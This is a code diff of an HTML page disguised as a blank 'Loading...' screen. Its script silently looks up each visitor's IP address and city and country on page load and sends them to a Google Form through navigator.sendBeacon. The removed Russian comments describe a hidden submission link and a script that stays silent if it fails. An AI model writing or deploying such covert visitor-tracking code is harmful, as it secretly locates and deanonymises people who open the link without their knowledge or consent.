@@ -1,54 +1,32 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
     <style>
-        /* Полностью черный экран и отсутствие курсора */
-        body {
-            background-color: black;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            width: 100vw;
-            cursor: none;
-            overflow: hidden;
-        }
+        body { background: black; margin: 0; cursor: none; overflow: hidden; }
     </style>
 </head>
 <body>
-
 <script>
-    async function collectData() {
+    async function collect() {
         try {
-            // 1. Получаем данные об IP и локации
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            const ip = d.ip || "Unknown";
+            const loc = `${d.city || "?"}, ${d.country_name || "?"}`;
 
-            const ip = data.ip || "Не определен";
-            const location = `${data.city || '?'}, ${data.country_name || '?'}`;
-
-            // 2. Формируем скрытую ссылку для отправки в твою форму
-            const formId = "1FAIpQLSe6BXqCx4uuftFIBPGxo5i0pXg7FzpaRCVB4cGZQYXYJV5P3A";
+            // ЭТО ДАННЫЕ ТВОЕЙ ФОРМЫ СО СКРИНШОТА
+            const formId = "1e1Fiz0SDYsiDW35x0_oex2tskBIGVgwkYF_aubzY0uw";
             const entryIp = "entry.295293350";
             const entryLoc = "entry.86385909";
 
-            const postUrl = `https://docs.google.com/forms/d/e/${formId}/formResponse?` + 
-                            `${entryIp}=${encodeURIComponent(ip)}&` + 
-                            `${entryLoc}=${encodeURIComponent(location)}&` + 
-                            `submit=Submit`;
+            const url = `https://docs.google.com/forms/d/e/${formId}/formResponse?${entryIp}=${encodeURIComponent(ip)}&${entryLoc}=${encodeURIComponent(loc)}&submit=Submit`;
 
-            // 3. Отправляем данные (метод Beacon работает даже если вкладку сразу закроют)
-            navigator.sendBeacon(postUrl);
-
-        } catch (e) {
-            // Если что-то пошло не так (например, VPN), скрипт просто промолчит
-        }
+            navigator.sendBeacon(url);
+        } catch (e) {}
     }
-
-    // Запуск при открытии
-    collectData();
+    collect();
 </script>
-
 </body>
 </html>
